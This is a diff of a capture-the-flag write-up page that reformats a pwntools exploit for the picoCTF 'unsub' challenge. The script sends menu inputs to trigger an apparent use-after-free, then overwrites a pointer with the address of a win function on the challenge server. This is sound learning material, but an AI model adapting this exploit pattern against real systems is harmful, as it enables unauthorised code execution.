@@ -38,42 +38,27 @@
 <div>
     <img src="../imgs/pico/chall6_2.png" alt="">
 </div>
-<div>
-    <style 
-        type="text/css">
-            pre code {
-                      background-color: #008080;
-                      border: 1px solid #999;
-                      display: block;
-                      padding: 15px;
-                      color:  #F5F5DC;
-                    }
-    </style>
-    <pre>
-        <code>
-#!/usr/bin/env python
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #586e75; font-style: italic">#!/usr/bin/env python</span>
 
-from pwn import *
-elf = context.binary = ELF('./unsub')
+<span style="color: #cb4b16">from</span> <span style="color: #268bd2">pwn</span> <span style="color: #cb4b16">import</span> <span style="color: #586e75">*</span>
+<span style="color: #839496">elf</span> <span style="color: #586e75">=</span> <span style="color: #839496">context</span><span style="color: #586e75">.</span><span style="color: #839496">binary</span> <span style="color: #586e75">=</span> <span style="color: #839496">ELF(</span><span style="color: #2aa198">'./unsub'</span><span style="color: #839496">)</span>
 
-local = False
+<span style="color: #839496">local</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">False</span>
 
-if local:
-    p = elf.process()
-else:
-    host = 'mercury.picoctf.net'
-    port = 48259
-    p = remote(host,port)
+<span style="color: #859900">if</span> <span style="color: #839496">local:</span>
+    <span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">process()</span>
+<span style="color: #859900">else</span><span style="color: #839496">:</span>
+    <span style="color: #839496">host</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">'mercury.picoctf.net'</span>
+    <span style="color: #839496">port</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">48259</span>
+    <span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">remote(host,port)</span>
 
-p.send('i')
-p.send('y')
-p.send('l')
-p.clean()
-p.sendline(p32(elf.sym.hahaexploitgobrrr))
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">send(</span><span style="color: #2aa198">'i'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">send(</span><span style="color: #2aa198">'y'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">send(</span><span style="color: #2aa198">'l'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">clean()</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(p32(elf</span><span style="color: #586e75">.</span><span style="color: #839496">sym</span><span style="color: #586e75">.</span><span style="color: #839496">hahaexploitgobrrr))</span>
 
 
-p.interactive()
-        </code>
-    </pre>
-</div>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">interactive()</span>
+</pre></div>
 <script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
